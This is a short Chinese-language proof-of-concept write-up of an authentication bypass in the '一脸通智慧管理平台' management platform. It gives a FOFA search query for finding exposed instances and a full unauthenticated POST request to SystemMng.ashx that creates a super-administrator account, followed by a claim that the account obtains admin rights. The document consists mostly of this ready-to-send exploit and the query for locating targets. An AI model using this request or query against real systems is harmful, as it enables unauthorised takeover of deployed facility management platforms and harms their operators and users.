# 一脸通智慧管理平台权限绕过漏洞

## 1.漏洞描述

一脸通智慧管理平台1.0.55.0.0.1及其以下版本SystemMng.ashx接口处存在权限绕过漏洞，导致特权管理不当，未经身份认证的攻击者可以通过此漏洞创建超级管理员账户。

## 2.搜索语法

```plain
fofa：title="欢迎使用脸爱云 一脸通智慧管理平台"
```

## 3.漏洞复现

```plain
POST /SystemMng.ashx HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Accept-Language: en
Content-Length: 174

operatorName=test123456&operatorPwd=123456&operpassword=123456&operatorRole=00&visible_jh=%E8%AF%B7%E9%80%89%E6%8B%A9&visible_dorm=%E8%AF%B7%E9%80%89%E6%8B%A9&funcName=addOperators
```

![image-20240615204131021](D:\py\POC\一脸通智慧管理平台权限绕过漏洞\image-20240615204131021.png)

成功创建账号，登陆后台可以看到自己创建的账号拥有管理员权限

![f35d6bd762f1c767b1d0f9109e27643](D:\py\POC\一脸通智慧管理平台权限绕过漏洞\f35d6bd762f1c767b1d0f9109e27643.png)